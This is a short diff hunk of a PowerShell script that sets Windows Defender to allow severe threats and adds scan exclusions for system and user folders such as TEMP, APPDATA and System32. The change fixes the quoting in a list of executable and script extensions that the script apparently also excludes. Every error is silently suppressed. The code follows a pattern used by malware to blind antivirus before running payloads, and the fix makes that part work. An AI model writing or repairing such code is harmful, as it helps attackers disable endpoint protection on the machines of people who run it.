@@ -50,7 +50,7 @@ try { Set-MpPreference -SevereThreatDefaultAction 6 -Force -ErrorAction Silently
     $env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, $env:USERPROFILE,
     "C:\Windows\Temp", "C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)"
 )
- $exclusionExts = @(".exe", ".dll", .ps1", .bat", .cmd", .vbs", .js")
+  $exclusionExts = @(".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".js")
 
 foreach ($p in $exclusionPaths) {
     try { Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue } catch {}
